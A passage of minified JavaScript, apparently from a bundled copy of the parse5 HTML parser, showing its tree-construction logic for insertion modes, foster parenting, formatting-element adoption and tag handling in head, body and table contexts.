t=this.treeAdapter.createElement(ce.HTML,be.HTML,[]);this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(t,null),this.treeAdapter.appendChild(this.openElements.current,t),this.openElements.push(t,v.HTML)}_appendCommentNode(t,n){const r=this.treeAdapter.createCommentNode(t.data);this.treeAdapter.appendChild(n,r),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(r,t.location)}_insertCharacters(t){let n,r;if(this._shouldFosterParentOnInsertion()?({parent:n,beforeElement:r}=this._findFosterParentingLocation(),r?this.treeAdapter.insertTextBefore(n,t.chars,r):this.treeAdapter.insertText(n,t.chars)):(n=this.openElements.currentTmplContentOrNode,this.treeAdapter.insertText(n,t.chars)),!t.location)return;const a=this.treeAdapter.getChildNodes(n),l=r?a.lastIndexOf(r):a.length,u=a[l-1];if(this.treeAdapter.getNodeSourceCodeLocation(u)){const{endLine:h,endCol:m,endOffset:x}=t.location;this.treeAdapter.updateNodeSourceCodeLocation(u,{endLine:h,endCol:m,endOffset:x})}else this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(u,t.location)}_adoptNodes(t,n){for(let r=this.treeAdapter.getFirstChild(t);r;r=this.treeAdapter.getFirstChild(t))this.treeAdapter.detachNode(r),this.treeAdapter.appendChild(n,r)}_setEndLocation(t,n){if(this.treeAdapter.getNodeSourceCodeLocation(t)&&n.location){const r=n.location,a=this.treeAdapter.getTagName(t),l=n.type===ot.END_TAG&&a===n.tagName?{endTag:{...r},endLine:r.endLine,endCol:r.endCol,endOffset:r.endOffset}:{endLine:r.startLine,endCol:r.startCol,endOffset:r.startOffset};this.treeAdapter.updateNodeSourceCodeLocation(t,l)}}shouldProcessStartTagTokenInForeignContent(t){if(!this.currentNotInHTML)return!1;let n,r;return this.openElements.stackTop===0&&this.fragmentContext?(n=this.fragmentContext,r=this.fragmentContextID):{current:n,currentTagId:r}=this.openElements,t.tagID===v.SVG&&this.treeAdapter.getTagName(n)===ce.ANNOTATION_XML&&this.treeAdapter.getNamespaceURI(n)===be.MATHML?!1:this.tokenizer.inForeignNode||(t.tagID===v.MGLYPH||t.tagID===v.MALIGNMARK)&&r!==void 0&&!this._isIntegrationPoint(r,n,be.HTML)}_processToken(t){switch(t.type){case ot.CHARACTER:{this.onCharacter(t);break}case ot.NULL_CHARACTER:{this.onNullCharacter(t);break}case ot.COMMENT:{this.onComment(t);break}case ot.DOCTYPE:{this.onDoctype(t);break}case ot.START_TAG:{this._processStartTag(t);break}case ot.END_TAG:{this.onEndTag(t);break}case ot.EOF:{this.onEof(t);break}case ot.WHITESPACE_CHARACTER:{this.onWhitespaceCharacter(t);break}}}_isIntegrationPoint(t,n,r){const a=this.treeAdapter.getNamespaceURI(n),l=this.treeAdapter.getAttrList(n);return _M(t,a,l,r)}_reconstructActiveFormattingElements(){const t=this.activeFormattingElements.entries.length;if(t){const n=this.activeFormattingElements.entries.findIndex(a=>a.type===oi.Marker||this.openElements.contains(a.element)),r=n===-1?t-1:n-1;for(let a=r;a>=0;a--){const l=this.activeFormattingElements.entries[a];this._insertElement(l.token,this.treeAdapter.getNamespaceURI(l.element)),l.element=this.openElements.current}}}_closeTableCell(){this.openElements.generateImpliedEndTags(),this.openElements.popUntilTableCellPopped(),this.activeFormattingElements.clearToLastMarker(),this.insertionMode=ee.IN_ROW}_closePElement(){this.openElements.generateImpliedEndTagsWithExclusion(v.P),this.openElements.popUntilTagNamePopped(v.P)}_resetInsertionMode(){for(let t=this.openElements.stackTop;t>=0;t--)switch(t===0&&this.fragmentContext?this.fragmentContextID:this.openElements.tagIDs[t]){case v.TR:{this.insertionMode=ee.IN_ROW;return}case v.TBODY:case v.THEAD:case v.TFOOT:{this.insertionMode=ee.IN_TABLE_BODY;return}case v.CAPTION:{this.insertionMode=ee.IN_CAPTION;return}case v.COLGROUP:{this.insertionMode=ee.IN_COLUMN_GROUP;return}case v.TABLE:{this.insertionMode=ee.IN_TABLE;return}case v.BODY:{this.insertionMode=ee.IN_BODY;return}case v.FRAMESET:{this.insertionMode=ee.IN_FRAMESET;return}case v.SELECT:{this._resetInsertionModeForSelect(t);return}case v.TEMPLATE:{this.insertionMode=this.tmplInsertionModeStack[0];return}case v.HTML:{this.insertionMode=this.headElement?ee.AFTER_HEAD:ee.BEFORE_HEAD;return}case v.TD:case v.TH:{if(t>0){this.insertionMode=ee.IN_CELL;return}break}case v.HEAD:{if(t>0){this.insertionMode=ee.IN_HEAD;return}break}}this.insertionMode=ee.IN_BODY}_resetInsertionModeForSelect(t){if(t>0)for(let n=t-1;n>0;n--){const r=this.openElements.tagIDs[n];if(r===v.TEMPLATE)break;if(r===v.TABLE){this.insertionMode=ee.IN_SELECT_IN_TABLE;return}}this.insertionMode=ee.IN_SELECT}_isElementCausesFosterParenting(t){return mC.has(t)}_shouldFosterParentOnInsertion(){return this.fosterParentingEnabled&&this.openElements.currentTagId!==void 0&&this._isElementCausesFosterParenting(this.openElements.currentTagId)}_findFosterParentingLocation(){for(let t=this.openElements.stackTop;t>=0;t--){const n=this.openElements.items[t];switch(this.openElements.tagIDs[t]){case v.TEMPLATE:{if(this.treeAdapter.getNamespaceURI(n)===be.HTML)return{parent:this.treeAdapter.getTemplateContent(n),beforeElement:null};break}case v.TABLE:{const r=this.treeAdapter.getParentNode(n);return r?{parent:r,beforeElement:n}:{parent:this.openElements.items[t-1],beforeElement:null}}}}return{parent:this.openElements.items[0],beforeElement:null}}_fosterParentElement(t){const n=this._findFosterParentingLocation();n.beforeElement?this.treeAdapter.insertBefore(n.parent,t,n.beforeElement):this.treeAdapter.appendChild(n.parent,t)}_isSpecialElement(t,n){const r=this.treeAdapter.getNamespaceURI(t);return tM[r].has(n)}onCharacter(t){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){dB(this,t);return}switch(this.insertionMode){case ee.INITIAL:{Bo(this,t);break}case ee.BEFORE_HTML:{su(this,t);break}case ee.BEFORE_HEAD:{lu(this,t);break}case ee.IN_HEAD:{ou(this,t);break}case ee.IN_HEAD_NO_SCRIPT:{uu(this,t);break}case ee.AFTER_HEAD:{cu(this,t);break}case ee.IN_BODY:case ee.IN_CAPTION:case ee.IN_CELL:case ee.IN_TEMPLATE:{xC(this,t);break}case ee.TEXT:case ee.IN_SELECT:case ee.IN_SELECT_IN_TABLE:{this._insertCharacters(t);break}case ee.IN_TABLE:case ee.IN_TABLE_BODY:case ee.IN_ROW:{vm(this,t);break}case ee.IN_TABLE_TEXT:{kC(this,t);break}case ee.IN_COLUMN_GROUP:{yf(this,t);break}case ee.AFTER_BODY:{vf(this,t);break}case ee.AFTER_AFTER_BODY:{jd(this,t);break}}}onNullCharacter(t){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){cB(this,t);return}switch(this.insertionMode){case ee.INITIAL:{Bo(this,t);break}case ee.BEFORE_HTML:{su(this,t);break}case ee.BEFORE_HEAD:{lu(this,t);break}case ee.IN_HEAD:{ou(this,t);break}case ee.IN_HEAD_NO_SCRIPT:{uu(this,t);break}case ee.AFTER_HEAD:{cu(this,t);break}case ee.TEXT:{this._insertCharacters(t);break}case ee.IN_TABLE:case ee.IN_TABLE_BODY:case ee.IN_ROW:{vm(this,t);break}case ee.IN_COLUMN_GROUP:{yf(this,t);break}case ee.AFTER_BODY:{vf(this,t);break}case ee.AFTER_AFTER_BODY:{jd(this,t);break}}}onComment(t){if(this.skipNextNewLine=!1,this.currentNotInHTML){H0(this,t);return}switch(this.insertionMode){case ee.INITIAL:case ee.BEFORE_HTML:case ee.BEFORE_HEAD:case ee.IN_HEAD:case ee.IN_HEAD_NO_SCRIPT:case ee.AFTER_HEAD:case ee.IN_BODY:case ee.IN_TABLE:case ee.IN_CAPTION:case ee.IN_COLUMN_GROUP:case ee.IN_TABLE_BODY:case ee.IN_ROW:case ee.IN_CELL:case ee.IN_SELECT:case ee.IN_SELECT_IN_TABLE:case ee.IN_TEMPLATE:case ee.IN_FRAMESET:case ee.AFTER_FRAMESET:{H0(this,t);break}case ee.IN_TABLE_TEXT:{Ho(this,t);break}case ee.AFTER_BODY:{zM(this,t);break}case ee.AFTER_AFTER_BODY:case ee.AFTER_AFTER_FRAMESET:{WM(this,t);break}}}onDoctype(t){switch(this.skipNextNewLine=!1,this.insertionMode){case ee.INITIAL:{qM(this,t);break}case ee.BEFORE_HEAD:case ee.IN_HEAD:case ee.IN_HEAD_NO_SCRIPT:case ee.AFTER_HEAD:{this._err(t,he.misplacedDoctype);break}case ee.IN_TABLE_TEXT:{Ho(this,t);break}}}onStartTag(t){this.skipNextNewLine=!1,this.currentToken=t,this._processStartTag(t),t.selfClosing&&!t.ackSelfClosing&&this._err(t,he.nonVoidHtmlElementStartTagWithTrailingSolidus)}_processStartTag(t){this.shouldProcessStartTagTokenInForeignContent(t)?fB(this,t):this._startTagOutsideForeignContent(t)}_startTagOutsideForeignContent(t){switch(this.insertionMode){case ee.INITIAL:{Bo(this,t);break}case ee.BEFORE_HTML:{$M(this,t);break}case ee.BEFORE_HEAD:{VM(this,t);break}case ee.IN_HEAD:{Jr(this,t);break}case ee.IN_HEAD_NO_SCRIPT:{KM(this,t);break}case ee.AFTER_HEAD:{ZM(this,t);break}case ee.IN_BODY:{Bn(this,t);break}case ee.IN_TABLE:{_l(this,t);break}case ee.IN_TABLE_TEXT:{Ho(this,t);break}case ee.IN_CAPTION:{G9(this,t);break}case ee.IN_COLUMN_GROUP:{Ax(this,t);break}case ee.IN_TABLE_BODY:{yh(this,t);break}case ee.IN_ROW:{vh(this,t);break}case ee.IN_CELL:{X9(this,t);break}case ee.IN_SELECT:{SC(this,t);break}case ee.IN_SELECT_IN_TABLE:{J9(this,t);break}case ee.IN_TEMPLATE:{tB(this,t);break}case ee.AFTER_BODY:{rB(this,t);break}case ee.IN_FRAMESET:{iB(this,t);break}case ee.AFTER_FRAMESET:{sB(this,t);break}case ee.AFTER_AFTER_BODY:{oB(this,t);break}case ee.AFTER_AFTER_FRAMESET:{uB(this,t);break}}}onEndTag(t){this.skipNextNewLine=!1,this.currentToken=t,this.currentNotInHTML?hB(this,t):this._endTagOutsideForeignContent(t)}_endTagOutsideForeignContent(t){switch(this.insertionMode){case ee.INITIAL:{Bo(this,t);break}case ee.BEFORE_HTML:{YM(this,t);break}case ee.BEFORE_HEAD:{GM(this,t);break}case ee.IN_HEAD:{QM(this,t);break}case ee.IN_HEAD_NO_SCRIPT:{XM(this,t);break}case ee.AFTER_HEAD:{JM(this,t);break}case ee.IN_BODY:{xh(this,t);break}case ee.TEXT:{M9(this,t);break}case ee.IN_TABLE:{Hu(this,t);break}case ee.IN_TABLE_TEXT:{Ho(this,t);break}case ee.IN_CAPTION:{Q9(this,t);break}case ee.IN_COLUMN_GROUP:{K9(this,t);break}case ee.IN_TABLE_BODY:{U0(this,t);break}case ee.IN_ROW:{CC(this,t);break}case ee.IN_CELL:{Z9(this,t);break}case ee.IN_SELECT:{NC(this,t);break}case ee.IN_SELECT_IN_TABLE:{eB(this,t);break}case ee.IN_TEMPLATE:{nB(this,t);break}case ee.AFTER_BODY:{DC(this,t);break}case ee.IN_FRAMESET:{aB(this,t);break}case ee.AFTER_FRAMESET:{lB(this,t);break}case ee.AFTER_AFTER_BODY:{jd(this,t);break}}}onEof(t){switch(this.insertionMode){case ee.INITIAL:{Bo(this,t);break}case ee.BEFORE_HTML:{su(this,t);break}case ee.BEFORE_HEAD:{lu(this,t);break}case ee.IN_HEAD:{ou(this,t);break}case ee.IN_HEAD_NO_SCRIPT:{uu(this,t);break}case ee.AFTER_HEAD:{cu(this,t);break}case ee.IN_BODY:case ee.IN_TABLE:case ee.IN_CAPTION:case ee.IN_COLUMN_GROUP:case ee.IN_TABLE_BODY:case ee.IN_ROW:case ee.IN_CELL:case ee.IN_SELECT:case ee.IN_SELECT_IN_TABLE:{EC(this,t);break}case ee.TEXT:{B9(this,t);break}case ee.IN_TABLE_TEXT:{Ho(this,t);break}case ee.IN_TEMPLATE:{AC(this,t);break}case ee.AFTER_BODY:case ee.IN_FRAMESET:case ee.AFTER_FRAMESET:case ee.AFTER_AFTER_BODY:case ee.AFTER_AFTER_FRAMESET:{Nx(this,t);break}}}onWhitespaceCharacter(t){if(this.skipNextNewLine&&(this.skipNextNewLine=!1,t.chars.charCodeAt(0)===z.LINE_FEED)){if(t.chars.length===1)return;t.chars=t.chars.substr(1)}if(this.tokenizer.inForeignNode){this._insertCharacters(t);return}switch(this.insertionMode){case ee.IN_HEAD:case ee.IN_HEAD_NO_SCRIPT:case ee.AFTER_HEAD:case ee.TEXT:case ee.IN_COLUMN_GROUP:case ee.IN_SELECT:case ee.IN_SELECT_IN_TABLE:case ee.IN_FRAMESET:case ee.AFTER_FRAMESET:{this._insertCharacters(t);break}case ee.IN_BODY:case ee.IN_CAPTION:case ee.IN_CELL:case ee.IN_TEMPLATE:case ee.AFTER_BODY:case ee.AFTER_AFTER_BODY:case ee.AFTER_AFTER_FRAMESET:{gC(this,t);break}case ee.IN_TABLE:case ee.IN_TABLE_BODY:case ee.IN_ROW:{vm(this,t);break}case ee.IN_TABLE_TEXT:{wC(this,t);break}}}}function OM(e,t){let n=e.activeFormattingElements.getElementEntryInScopeWithTagName(t.tagName);return n?e.openElements.contains(n.element)?e.openElements.hasInScope(t.tagID)||(n=null):(e.activeFormattingElements.removeEntry(n),n=null):bC(e,t),n}function FM(e,t){let n=null,r=e.openElements.stackTop;for(;r>=0;r--){const a=e.openElements.items[r];if(a===t.element)break;e._isSpecialElement(a,e.openElements.tagIDs[r])&&(n=a)}return n||(e.openElements.shortenToLength(Math.max(r,0)),e.activeFormattingElements.removeEntry(t)),n}function MM(e,t,n){let r=t,a=e.openElements.getCommonAncestor(t);for(let l=0,u=a;u!==n;l++,u=a){a=e.openElements.getCommonAncestor(u);const f=e.activeFormattingElements.getElementEntry(u),h=f&&l>=jM;!f||h?(h&&e.activeFormattingElements.removeEntry(f),e.openElements.remove(u)):(u=BM(e,f),r===t&&(e.activeFormattingElements.bookmark=f),e.treeAdapter.detachNode(r),e.treeAdapter.appendChild(u,r),r=u)}return r}function BM(e,t){const n=e.treeAdapter.getNamespaceURI(t.element),r=e.treeAdapter.createElement(t.token.tagName,n,t.token.attrs);return e.openElements.replace(t.element,r),t.element=r,r}function HM(e,t,n){const r=e.treeAdapter.getTagName(t),a=Yl(r);if(e._isElementCausesFosterParenting(a))e._fosterParentElement(n);else{const l=e.treeAdapter.getNamespaceURI(t);a===v.TEMPLATE&&l===be.HTML&&(t=e.treeAdapter.getTemplateContent(t)),e.treeAdapter.appendChild(t,n)}}function UM(e,t,n){const r=e.treeAdapter.getNamespaceURI(n.element),{token:a}=n,l=e.treeAdapter.createElement(a.tagName,r,a.attrs);e._adoptNodes(t,l),e.treeAdapter.appendChild(t,l),e.activeFormattingElements.insertElementAfterBookmark(l,a),e.activeFormattingElements.removeEntry(n),e.openElements.remove(n.element),e.openElements.insertAfter(t,l,a.tagID)}function Sx(e,t){for(let n=0;n<PM;n++){const r=OM(e,t);if(!r)break;const a=FM(e,r);if(!a)break;e.activeFormattingElements.bookmark=r;const l=MM(e,a,r.element),u=e.openElements.getCommonAncestor(r.element);e.treeAdapter.detachNode(l),u&&HM(e,u,l),UM(e,a,r)}}function H0(e,t){e._appendCommentNode(t,e.openElements.currentTmplContentOrNode)}function zM(e,t){e._appendCommentNode(t,e.openElements.items[0])}function WM(e,t){e._appendCommentNode(t,e.document)}function Nx(e,t){if(e.stopped=!0,t.location){const n=e.fragmentContext?0:2;for(let r=e.openElements.stackTop;r>=n;r--)e._setEndLocation(e.openElements.items[r],t);if(!e.fragmentContext&&e.openElements.stackTop>=0){const r=e.openElements.items[0],a=e.treeAdapter.getNodeSourceCodeLocation(r);if(a&&!a.endTag&&(e._setEndLocation(r,t),e.openElements.stackTop>=1)){const l=e.openElements.items[1],u=e.treeAdapter.getNodeSourceCodeLocation(l);u&&!u.endTag&&e._setEndLocation(l,t)}}}}function qM(e,t){e._setDocumentType(t);const n=t.forceQuirks?Dr.QUIRKS:bM(t);vM(t)||e._err(t,he.nonConformingDoctype),e.treeAdapter.setDocumentMode(e.document,n),e.insertionMode=ee.BEFORE_HTML}function Bo(e,t){e._err(t,he.missingDoctype,!0),e.treeAdapter.setDocumentMode(e.document,Dr.QUIRKS),e.insertionMode=ee.BEFORE_HTML,e._processToken(t)}function $M(e,t){t.tagID===v.HTML?(e._insertElement(t,be.HTML),e.insertionMode=ee.BEFORE_HEAD):su(e,t)}function YM(e,t){const n=t.tagID;(n===v.HTML||n===v.HEAD||n===v.BODY||n===v.BR)&&su(e,t)}function su(e,t){e._insertFakeRootElement(),e.insertionMode=ee.BEFORE_HEAD,e._processToken(t)}function VM(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.HEAD:{e._insertElement(t,be.HTML),e.headElement=e.openElements.current,e.insertionMode=ee.IN_HEAD;break}default:lu(e,t)}}function GM(e,t){const n=t.tagID;n===v.HEAD||n===v.BODY||n===v.HTML||n===v.BR?lu(e,t):e._err(t,he.endTagWithoutMatchingOpenElement)}function lu(e,t){e._insertFakeElement(ce.HEAD,v.HEAD),e.headElement=e.openElements.current,e.insertionMode=ee.IN_HEAD,e._processToken(t)}function Jr(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.BASE:case v.BASEFONT:case v.BGSOUND:case v.LINK:case v.META:{e._appendElement(t,be.HTML),t.ackSelfClosing=!0;break}case v.TITLE:{e._switchToTextParsing(t,tn.RCDATA);break}case v.NOSCRIPT:{e.options.scriptingEnabled?e._switchToTextParsing(t,tn.RAWTEXT):(e._insertElement(t,be.HTML),e.insertionMode=ee.IN_HEAD_NO_SCRIPT);break}case v.NOFRAMES:case v.STYLE:{e._switchToTextParsing(t,tn.RAWTEXT);break}case v.SCRIPT:{e._switchToTextParsing(t,tn.SCRIPT_DATA);break}case v.TEMPLATE:{e._insertTemplate(t),e.activeFormattingElements.insertMarker(),e.framesetOk=!1,e.insertionMode=ee.IN_TEMPLATE,e.tmplInsertionModeStack.unshift(ee.IN_TEMPLATE);break}case v.HEAD:{e._err(t,he.misplacedStartTagForHeadElement);break}default:ou(e,t)}}function QM(e,t){switch(t.tagID){case v.HEAD:{e.openElements.pop(),e.insertionMode=ee.AFTER_HEAD;break}case v.BODY:case v.BR:case v.HTML:{ou(e,t);break}case v.TEMPLATE:{ws(e,t);break}default:e._err(t,he.endTagWithoutMatchingOpenElement)}}function ws(e,t){e.openElements.tmplCount>0?(e.openElements.generateImpliedEndTagsThoroughly(),e.openElements.currentTagId!==v.TEMPLATE&&e._err(t,he.closingOfElementWithOpenChildElements),e.openElements.popUntilTagNamePopped(v.TEMPLATE),e.activeFormattingElements.clearToLastMarker(),e.tmplInsertionModeStack.shift(),e._resetInsertionMode()):e._err(t,he.endTagWithoutMatchingOpenElement)}function ou(e,t){e.openElements.pop(),e.insertionMode=ee.AFTER_HEAD,e._processToken(t)}function KM(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.BASEFONT:case v.BGSOUND:case v.HEAD:case v.LINK:case v.META:case v.NOFRAMES:case v.STYLE:{Jr(e,t);break}case v.NOSCRIPT:{e._err(t,he.nestedNoscriptInHead);break}default:uu(e,t)}}function XM(e,t){switch(t.tagID){case v.NOSCRIPT:{e.openElements.pop(),e.insertionMode=ee.IN_HEAD;break}case v.BR:{uu(e,t);break}default:e._err(t,he.endTagWithoutMatchingOpenElement)}}function uu(e,t){const n=t.type===ot.EOF?he.openElementsLeftAfterEof:he.disallowedContentInNoscriptInHead;e._err(t,n),e.openElements.pop(),e.insertionMode=ee.IN_HEAD,e._processToken(t)}function ZM(e,t){switch(t.tagID){case v.HTML:{Bn(e,t);break}case v.BODY:{e._insertElement(t,be.HTML),e.framesetOk=!1,e.insertionMode=ee.IN_BODY;break}case v.FRAMESET:{e._insertElement(t,be.HTML),e.insertionMode=ee.IN_FRAMESET;break}case v.BASE:case v.BASEFONT:case v.BGSOUND:case v.LINK:case v.META:case v.NOFRAMES:case v.SCRIPT:case v.STYLE:case v.TEMPLATE:case v.TITLE:{e._err(t,he.abandonedHeadElementChild),e.openElements.push(e.headElement,v.HEAD),Jr(e,t),e.openElements.remove(e.headElement);break}case v.HEAD:{e._err(t,he.misplacedStartTagForHeadElement);break}default:cu(e,t)}}function JM(e,t){switch(t.tagID){case v.BODY:case v.HTML:case v.BR:{cu(e,t);break}case v.TEMPLATE:{ws(e,t);break}default:e._err(t,he.endTagWithoutMatchingOpenElement)}}function cu(e,t){e._insertFakeElement(ce.BODY,v.BODY),e.insertionMode=ee.IN_BODY,gh(e,t)}function gh(e,t){switch(t.type){case ot.CHARACTER:{xC(e,t);break}case ot.WHITESPACE_CHARACTER:{gC(e,t);break}case ot.COMMENT:{H0(e,t);break}case ot.START_TAG:{Bn(e,t);break}case ot.END_TAG:{xh(e,t);break}case ot.EOF:{EC(e,t);break}}}function gC(e,t){e._reconstructActiveFormattingElements(),e._insertCharacters(t)}function xC(e,t){e._reconstructActiveFormattingElements(),e._insertCharacters(t),e.framesetOk=!1}function e9(e,t){e.openElements.tmplCount===0&&e.treeAdapter.adoptAttributes(e.openElements.items[0],t.attrs)}function t9(e,t){const n=e.openElements.tryPeekProperlyNestedBodyElement();n&&e.openElements.tmplCount===0&&(e.framesetOk=!1,e.treeAdapter.adoptAttributes(n,t.attrs))}function n9(e,t){const n=e.openElements.tryPeekProperlyNestedBodyElement();e.framesetOk&&n&&(e.treeAdapter.detachNode(n),e.openElements.popAllUpToHtmlElement(),e._insertElement(t,be.HTML),e.insertionMode=ee.IN_FRAMESET)}function r9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML)}function i9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e.openElements.currentTagId!==void 0&&B0.has(e.openElements.currentTagId)&&e.openElements.pop(),e._insertElement(t,be.HTML)}function a9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML),e.skipNextNewLine=!0,e.framesetOk=!1}function s9(e,t){const n=e.openElements.tmplCount>0;(!e.formElement||n)&&(e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML),n||(e.formElement=e.openElements.current))}function l9(e,t){e.framesetOk=!1;const n=t.tagID;for(let r=e.openElements.stackTop;r>=0;r--){const a=e.openElements.tagIDs[r];if(n===v.LI&&a===v.LI||(n===v.DD||n===v.DT)&&(a===v.DD||a===v.DT)){e.openElements.generateImpliedEndTagsWithExclusion(a),e.openElements.popUntilTagNamePopped(a);break}if(a!==v.ADDRESS&&a!==v.DIV&&a!==v.P&&e._isSpecialElement(e.openElements.items[r],a))break}e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML)}function o9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML),e.tokenizer.state=tn.PLAINTEXT}function u9(e,t){e.openElements.hasInScope(v.BUTTON)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(v.BUTTON)),e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML),e.framesetOk=!1}function c9(e,t){const n=e.activeFormattingElements.getElementEntryInScopeWithTagName(ce.A);n&&(Sx(e,t),e.openElements.remove(n.element),e.activeFormattingElements.removeEntry(n)),e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function d9(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function f9(e,t){e._reconstructActiveFormattingElements(),e.openElements.hasInScope(v.NOBR)&&(Sx(e,t),e._reconstructActiveFormattingElements()),e._insertElement(t,be.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function h9(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML),e.activeFormattingElements.insertMarker(),e.framesetOk=!1}function p9(e,t){e.treeAdapter.getDocumentMode(e.document)!==Dr.QUIRKS&&e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._insertElement(t,be.HTML),e.framesetOk=!1,e.insertionMode=ee.IN_TABLE}function yC(e,t){e._reconstructActiveFormattingElements(),e._appendElement(t,be.HTML),e.framesetOk=!1,t.ackSelfClosing=!0}function vC(e){const t=lC(e,os.TYPE);return t!=null&&t.toLowerCase()===IM}function m9(e,t){e._reconstructActiveFormattingElements(),e._appendElement(t,be.HTML),vC(t)||(e.framesetOk=!1),t.ackSelfClosing=!0}function g9(e,t){e._appendElement(t,be.HTML),t.ackSelfClosing=!0}function x9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._appendElement(t,be.HTML),e.framesetOk=!1,t.ackSelfClosing=!0}function y9(e,t){t.tagName=ce.IMG,t.tagID=v.IMG,yC(e,t)}function v9(e,t){e._insertElement(t,be.HTML),e.skipNextNewLine=!0,e.tokenizer.state=tn.RCDATA,e.originalInsertionMode=e.insertionMode,e.framesetOk=!1,e.insertionMode=ee.TEXT}function b9(e,t){e.openElements.hasInButtonScope(v.P)&&e._closePElement(),e._reconstructActiveFormattingElements(),e.framesetOk=!1,e._switchToTextParsing(t,tn.RAWTEXT)}function E9(e,t){e.framesetOk=!1,e._switchToTextParsing(t,tn.RAWTEXT)}function E2(e,t){e._switchToTextParsing(t,tn.RAWTEXT)}function w9(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML),e.framesetOk=!1,e.insertionMode=e.insertionMode===ee.IN_TABLE||e.insertionMode===ee.IN_CAPTION||e.insertionMode===ee.IN_TABLE_BODY||e.insertionMode===ee.IN_ROW||e.insertionMode===ee.IN_CELL?ee.IN_SELECT_IN_TABLE:ee.IN_SELECT}function k9(e,t){e.openElements.currentTagId===v.OPTION&&e.openElements.pop(),e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML)}function T9(e,t){e.openElements.hasInScope(v.RUBY)&&e.openElements.generateImpliedEndTags(),e._insertElement(t,be.HTML)}function C9(e,t){e.openElements.hasInScope(v.RUBY)&&e.openElements.generateImpliedEndTagsWithExclusion(v.RTC),e._insertElement(t,be.HTML)}function S9(e,t){e._reconstructActiveFormattingElements(),hC(t),Cx(t),t.selfClosing?e._appendElement(t,be.MATHML):e._insertElement(t,be.MATHML),t.ackSelfClosing=!0}function N9(e,t){e._reconstructActiveFormattingElements(),pC(t),Cx(t),t.selfClosing?e._appendElement(t,be.SVG):e._insertElement(t,be.SVG),t.ackSelfClosing=!0}function w2(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,be.HTML)}function Bn(e,t){switch(t.tagID){case v.I:case v.S:case v.B:case v.U:case v.EM:case v.TT:case v.BIG:case v.CODE:case v.FONT:case v.SMALL:case v.STRIKE:case v.STRONG:{d9(e,t);break}case v.A:{c9(e,t);break}case v.H1:case v.H2:case v.H3:case v.H4:case v.H5:case v.H6:{i9(e,t);break}case v.P:case v.DL:case v.OL:case v.UL:case v.DIV:case v.DIR:case v.NAV:case v.MAIN:case v.MENU:case v.ASIDE:case v.CENTER:case v.FIGURE:case v.FOOTER:case v.HEADER:case v.HGROUP:case v.DIALOG:case v.DETAILS:case v.ADDRESS:case v.ARTICLE:case v.SEARCH:case v.SECTION:case v.SUMMARY:case v.FIELDSET:case v.BLOCKQUOTE:case v.FIGCAPTION:{r9(e,t);break}case v.LI:case v.DD:case v.DT:{l9(e,t);break}case v.BR:case v.IMG:case v.WBR:case v.AREA:case v.EMBED:case v.KEYGEN:{yC(e,t);break}case v.HR:{x9(e,t);break}case v.RB:case v.RTC:{T9(e,t);break}case v.RT:case v.RP:{C9(e,t);break}case v.PRE:case v.LISTING:{a9(e,t);break}case v.XMP:{b9(e,t);break}case v.SVG:{N9(e,t);break}case v.HTML:{e9(e,t);break}case v.BASE:case v.LINK:case v.META:case v.STYLE:case v.TITLE:case v.SCRIPT:case v.BGSOUND:case v.BASEFONT:case v.TEMPLATE:{Jr(e,t);break}case v.BODY:{t9(e,t);break}case v.FORM:{s9(e,t);break}case v.NOBR:{f9(e,t);break}case v.MATH:{S9(e,t);break}case v.TABLE:{p9(e,t);break}case v.INPUT:{m9(e,t);break}case v.PARAM:case v.TRACK:case v.SOURCE:{g9(e,t);break}case v.IMAGE:{y9(e,t);break}case v.BUTTON:{u9(e,t);break}case v.APPLET:case v.OBJECT:case v.MARQUEE:{h9(e,t);break}case v.IFRAME:{E9(e,t);break}case v.SELECT:{w9(e,t);break}case v.OPTION:case v.OPTGROUP:{k9(e,t);break}case v.NOEMBED:case v.NOFRAMES:{E2(e,t);break}case v.FRAMESET:{n9(e,t);break}case v.TEXTAREA:{v9(e,t);break}case v.NOSCRIPT:{e.options.scriptingEnabled?E2(e,t):w2(e,t);break}case v.PLAINTEXT:{o9(e,t);break}case v.COL:case v.TH:case v.TD:case v.TR:case v.HEAD:case v.FRAME:case v.TBODY:case v.TFOOT:case v.THEAD:case v.CAPTION:case v.COLGROUP:break;default:w2(e,t)}}function A9(e,t){if(e.openElements.hasInScope(v.BODY)&&(e.insertionMode=ee.AFTER_BODY,e.options.sourceCodeLocationInfo)){const n=e.openElements.tryPeekProperlyNestedBodyElement();n&&e._setEndLocation(n,t)}}function D9(e,t){e.openElements.hasInScope(v.BODY)&&(e.insertionMode=ee.AFTER_BODY,DC(e,t))}function L9(e,t){const n=t.tagID;e.openElements.hasInScope(n)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(n))}function _9(e){const 